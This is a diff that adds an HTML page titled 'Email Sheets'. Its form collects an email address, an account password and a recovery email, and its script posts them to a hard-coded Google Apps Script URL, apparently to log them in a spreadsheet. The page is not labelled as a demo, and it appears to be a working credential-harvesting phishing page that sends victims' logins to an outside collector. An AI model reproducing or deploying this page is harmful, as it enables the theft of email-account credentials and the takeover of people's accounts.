@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/style.css">
+    <link rel="shortcut icon" href="images/fave.png">
+    <title>Email Sheets</title>
+</head>
+<body>
+    <div class="container">
+        <form name="submit-to-google-sheet">
+            <h1>Email</h1>
+            <div class="form-group">
+                <label for="Email">Email</label>
+                <input type="text" id="Email" name="Email" class="form-control" required>
+            </div>
+            <div class="form-group">
+                <label for="Password">Password</label>
+                <input type="password" id="Password" name="Password" class="form-control" required>
+            </div>
+            <div class="form-group">
+                <label for="Recovery">Recovery Email</label>
+                <input type="text" id="Recovery" name="Recovery" class="form-control" required>
+            </div>
+            <input type="submit" class="btn" value="Send">
+        </form>
+        <span id="msg"></span>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw385U7m7XxkDl0TUh-RP-pd0m7vSRJQbDrYyzWj6mZNzVTy_8U3WfoB0v8GxT6kY2leA/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                setTimeout(function(){
+                    msg.innerHTML = ""
+                },5000)
+                form.reset()
+            })
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+</body>
+</html>
